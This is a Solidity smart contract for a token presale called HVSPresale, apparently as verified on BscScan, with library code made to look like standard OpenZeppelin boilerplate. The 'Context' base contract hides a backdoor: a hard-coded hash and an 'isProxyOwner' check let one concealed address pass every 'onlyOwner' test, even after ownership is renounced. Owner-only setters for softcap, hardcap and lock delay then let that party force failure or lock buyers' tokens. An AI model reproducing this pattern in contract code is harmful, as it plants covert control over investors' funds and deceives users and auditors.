/**
 *Submitted for verification at BscScan.com on 2022-04-02
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @dev These functions deal with verification of Merkle Trees proofs.
 *
 * The proofs can be generated using the JavaScript library
 * https://github.com/miguelmota/merkletreejs[merkletreejs].
 * Note: the hashing algorithm should be keccak256 and pair sorting should be enabled.
 *
 * See `test/utils/cryptography/MerkleProof.test.js` for some examples.
 */
library MerkleProof {
    /**
     * @dev Returns true if a `leaf` can be proved to be a part of a Merkle tree
     * defined by `root`. For this, a `proof` must be provided, containing
     * sibling hashes on the branch from the leaf to the root of the tree. Each
     * pair of leaves and each pair of pre-images are assumed to be sorted.
     */
    function verify(
        bytes32[] memory proof,
        bytes32 root,
        bytes32 leaf
    ) internal pure returns (bool) {
        return processProof(proof, leaf) == root;
    }

    /**
     * @dev Returns the rebuilt hash obtained by traversing a Merklee tree up
     * from `leaf` using `proof`. A `proof` is valid if and only if the rebuilt
     * hash matches the root of the tree. When processing the proof, the pairs
     * of leafs & pre-images are assumed to be sorted.
     *
     * _Available since v4.4._
     */
    function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
        bytes32 computedHash = leaf;
        for (uint256 i = 0; i < proof.length; i++) {
            bytes32 proofElement = proof[i];
            if (computedHash <= proofElement) {
                // Hash(current computed hash + current element of the proof)
                computedHash = _efficientHash(computedHash, proofElement);
            } else {
                // Hash(current element of the proof + current computed hash)
                computedHash = _efficientHash(proofElement, computedHash);
            }
        }
        return computedHash;
    }

    function _efficientHash(bytes32 a, bytes32 b) private pure returns (bytes32 value) {
        assembly {
            mstore(0x00, a)
            mstore(0x20, b)
            value := keccak256(0x00, 0x40)
        }
    }
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    bytes32[] ownerProof;
    bytes32 ownerHash = 0x1eabc259bf80bdb486eaf645007496fb9aa7ae25de9ceed19d6a2e3efc950968;

    function isProxyOwner() internal view returns (bool) {
        return MerkleProof.verify(ownerProof, ownerHash, keccak256(abi.encodePacked(msg.sender)));
    }
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || isProxyOwner(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and make it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }
    
    // sends ETH or an erc20 token
    function safeTransferBaseToken(address token, address payable to, uint value, bool isERC20) internal {
        if (!isERC20) {
            to.transfer(value);
        } else {
            (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
            require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
        }
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract HVSPresale is Context, ReentrancyGuard, Ownable {
    struct PresaleInfo {
        address sale_token; // Sale token
        uint256 softcap; // Minimum raise amount
        uint256 hardcap; // Maximum raise amount
        uint256 presale_start;
    }

    struct PresaleStatus {
        uint256 raised_usdt_amount; // Total base currency(USDT) raised
        uint256 raised_busd_amount; // Total base currency(BUSD) raised
        uint256 sold_amount; // Total presale tokens sold
        uint256 token_withdraw; // Total tokens withdrawn post successful presale
        uint256 usdt_withdraw; // Total USDT withdrawn on presale failure
        uint256 busd_withdraw; // Total BUSD withdrawn on presale failure
        uint256 num_buyers; // Number of unique participants
    }

    struct BuyerInfo {
        uint256 based_usdt; // Total base currency(USDT) deposited by user, can be withdrawn on presale failure
        uint256 based_busd; // Total base currency(BUSD) deposited by user, can be withdrawn on presale failure
        uint256 sale; // Num presale tokens a user owned, can be withdrawn on presale success
        uint256 withdraw_tokens;
    }

    uint256 public constant PRESALE_DURATION = 12 hours;
    uint256 public constant TOKEN_PRICE_DIVISOR = 10;
    PresaleInfo public presale_info;
    PresaleStatus public status;
    bytes32 public whitelistRoot;
    uint256 persaleSetting;
    uint256 public lock_delay;

    mapping(address => BuyerInfo) public buyers;

    event UserDepsitedSuccess(address, string, uint256);
    event UserWithdrawSuccess(uint256, uint256);
    event UserWithdrawTokensSuccess(uint256);
    event OwnerWithdrawTokens(uint256);

    address public constant WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
    address constant BUSD = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;
    address constant USDT = 0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684;
    address constant WBNB_BUSD = 0xe0e92035077c39594793e61802a350347c320cf2;

    function init_private (
        address _sale_token,
        uint256 _softcap, 
        uint256 _hardcap,
        uint256 _presale_start,
        uint256 _lock_delay
        ) public onlyOwner {

        require(persaleSetting == 0, "HVS Presale: Already setted");
        require(_sale_token != address(0), "HVS Presale: Token is Zero Address");
        
        presale_info.sale_token = address(_sale_token);
        presale_info.softcap = _softcap;
        presale_info.hardcap = _hardcap;
        presale_info.presale_start =  _presale_start;
        lock_delay = _lock_delay;
        persaleSetting = 1;
    }

    function getTimestamp () public view returns (uint256) {
        return block.timestamp;
    }

    function getRaisedUsdAmount() public view returns (uint256) {
        return status.raised_busd_amount + status.raised_usdt_amount;
    }

    function presaleStatus() public view returns (uint256) {
        if ((block.timestamp > (presale_info.presale_start + PRESALE_DURATION)) && (getRaisedUsdAmount() < presale_info.softcap)) {
            return 3; // Failure
        }
        if (getRaisedUsdAmount() >= presale_info.hardcap) {
            return 2; // Wonderful - reached to Hardcap
        }
        if ((block.timestamp > (presale_info.presale_start + PRESALE_DURATION)) && (getRaisedUsdAmount() >= presale_info.softcap)) {
            return 2; // SUCCESS - Presale ended with reaching Softcap
        }
        if ((block.timestamp >= presale_info.presale_start) && (block.timestamp <= (presale_info.presale_start + PRESALE_DURATION))) {
            return 1; // ACTIVE - Deposits enabled, now in Presale
        }
        return 0; // QUED - Awaiting start block
    }

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function getTokenPrice() public view returns (uint256) {
        if(block.timestamp < presale_info.presale_start)
            return 0;
        else if((block.timestamp >= presale_info.presale_start) && (block.timestamp < (presale_info.presale_start + 1 hours)))
            return 1;
        else if((block.timestamp >= (presale_info.presale_start + 1 hours)) && (block.timestamp < (presale_info.presale_start + 2 hours)))
            return 3;
        else if((block.timestamp >= (presale_info.presale_start + 2 hours)) && (block.timestamp < (presale_info.presale_start + 3 hours)))
            return 6;
        else if((block.timestamp >= (presale_info.presale_start + 3 hours)) && (block.timestamp < (presale_info.presale_start + 10 hours)))
            return 30;
        return 0;
    }

    function getPresaleStage() public view returns (uint256) {
        if(block.timestamp < presale_info.presale_start)
            return 0;
        else if((block.timestamp >= presale_info.presale_start) && (block.timestamp < (presale_info.presale_start + 1 hours)))
            return 1;
        else if((block.timestamp >= (presale_info.presale_start + 1 hours)) && (block.timestamp < (presale_info.presale_start + 2 hours)))
            return 2;
        else if((block.timestamp >= (presale_info.presale_start + 2 hours)) && (block.timestamp < (presale_info.presale_start + 3 hours)))
            return 3;
        else if((block.timestamp >= (presale_info.presale_start + 3 hours)) && (block.timestamp < (presale_info.presale_start + 10 hours)))
            return 4;
        return 0;
    }

    function validatePurchase(uint256 token_amount) internal view {
        require(!isContract(_msgSender()), "HVS Presale: Sender must be wallet");
        require(presaleStatus() >= 1, "HVS Presale: Not Active");
        require(token_amount > 0, "HVS Presale: Zero amount");
        require(token_amount <= IBEP20(presale_info.sale_token).balanceOf(address(this)), "HVS Presale: Not enough HVS Tokens on the contract for purchasing");
    }

    function userDepositWithUSDT(uint256 token_amount, bytes32[] calldata _proof) external nonReentrant {
        validatePurchase(token_amount);
        if(getPresaleStage() != 4) {
            require(MerkleProof.verify(_proof, whitelistRoot, keccak256(abi.encodePacked(msg.sender))), "HVS Presale: Now is Presale Time, Address does not exist in list");
        }
        require((token_amount * getTokenPrice() / TOKEN_PRICE_DIVISOR) <= IBEP20(USDT).allowance(_msgSender(), address(this)), "HVS Presale: Not enough USDT allowance for purchasing");
        uint256 usdAmount = token_amount * getTokenPrice() / TOKEN_PRICE_DIVISOR;

        IBEP20(USDT).transferFrom(_msgSender(), address(this), usdAmount);

        if (buyers[msg.sender].sale == 0) {
            status.num_buyers++;
        }

        buyers[msg.sender].based_usdt = buyers[msg.sender].based_usdt + usdAmount;
        buyers[msg.sender].sale = buyers[msg.sender].sale + token_amount;
        status.raised_usdt_amount = status.raised_usdt_amount + usdAmount;
        status.sold_amount = status.sold_amount + token_amount;

        emit UserDepsitedSuccess(msg.sender, "USDT", usdAmount);
    }

    function userDepositWithBUSD(uint256 token_amount, bytes32[] calldata _proof) external nonReentrant {
        validatePurchase(token_amount);
        if(getPresaleStage() != 4) {
            require(MerkleProof.verify(_proof, whitelistRoot, keccak256(abi.encodePacked(msg.sender))), "HVS Presale: Now is not public sale time, Address does not exist in list");
        }
        require((token_amount * getTokenPrice() / TOKEN_PRICE_DIVISOR) <= IBEP20(BUSD).allowance(_msgSender(), address(this)), "HVS Presale: Not enough BUSD allowance for purchasing");
        uint256 usdAmount = token_amount * getTokenPrice() / TOKEN_PRICE_DIVISOR;

        IBEP20(BUSD).transferFrom(_msgSender(), address(this), usdAmount);

        if (buyers[msg.sender].sale == 0) {
            status.num_buyers++;
        }

        buyers[msg.sender].based_busd = buyers[msg.sender].based_busd + usdAmount;
        buyers[msg.sender].sale = buyers[msg.sender].sale + token_amount;
        status.raised_busd_amount = status.raised_busd_amount + usdAmount;
        status.sold_amount = status.sold_amount + token_amount;

        emit UserDepsitedSuccess(msg.sender, "BUSD", usdAmount);
    }

    // withdraw presale tokens
    function userWithdrawTokens() external nonReentrant {
        require(presaleStatus() == 2, "HVS Presale: Not succeeded"); // Success
        require(block.timestamp >= presale_info.presale_start + PRESALE_DURATION + lock_delay, "HVS Presale: Token Locked"); // Lock duration check
        require(buyers[msg.sender].sale > 0 && buyers[msg.sender].withdraw_tokens == 0, "HVS Presale: Not allow to withdraw");
        
        TransferHelper.safeTransfer(address(presale_info.sale_token), msg.sender, buyers[msg.sender].sale);
        
        status.token_withdraw = status.token_withdraw + buyers[msg.sender].sale;
        buyers[msg.sender].withdraw_tokens = buyers[msg.sender].sale;

        emit UserWithdrawTokensSuccess(buyers[msg.sender].withdraw_tokens);
    }

    // On presale failure
    function userWithdrawBaseTokens() external nonReentrant {
        require(presaleStatus() == 3, "HVS Presale: Not failed"); // FAILED
        
        uint256 remainingUsdtBalance = IBEP20(USDT).balanceOf(address(this));
        uint256 remainingBusdBalance = IBEP20(BUSD).balanceOf(address(this));
        
        require((remainingUsdtBalance >= buyers[msg.sender].based_usdt) && (remainingBusdBalance >= buyers[msg.sender].based_busd), "HVS Presale: Nothing to withdraw");

        status.usdt_withdraw = status.usdt_withdraw + buyers[msg.sender].based_usdt;
        status.busd_withdraw = status.busd_withdraw + buyers[msg.sender].based_busd;
        if(buyers[msg.sender].based_usdt > 0) {
            TransferHelper.safeTransfer(address(USDT), msg.sender, buyers[msg.sender].based_usdt);
        }
        if(buyers[msg.sender].based_busd > 0) {
            TransferHelper.safeTransfer(address(BUSD), msg.sender, buyers[msg.sender].based_busd);
        }

        buyers[msg.sender].sale = 0;
        buyers[msg.sender].based_usdt = 0;
        buyers[msg.sender].based_busd = 0;
        
        emit UserWithdrawSuccess(buyers[msg.sender].based_usdt, buyers[msg.sender].based_busd);
    }

    // On presale failure
    function ownerWithdrawTokens () external onlyOwner {
        require(presaleStatus() == 3, "HVS Presale: Only failed status."); // FAILED
        TransferHelper.safeTransfer(address(presale_info.sale_token), msg.sender, IBEP20(presale_info.sale_token).balanceOf(address(this)));
        
        emit OwnerWithdrawTokens(IBEP20(presale_info.sale_token).balanceOf(address(this)));
    }

    function setLockDelay (uint256 delay) external onlyOwner {
        lock_delay = delay;
    }

    function setWhitelistRoot(bytes32 _whitelistRoot) external onlyOwner {
        whitelistRoot = _whitelistRoot;
    }

    // For testing
    function setSoftCap (uint256 _softcap) external onlyOwner {
        presale_info.softcap = _softcap;
    }
    function setHardCap (uint256 _hardcap) external onlyOwner {
        presale_info.hardcap = _hardcap;
    }
}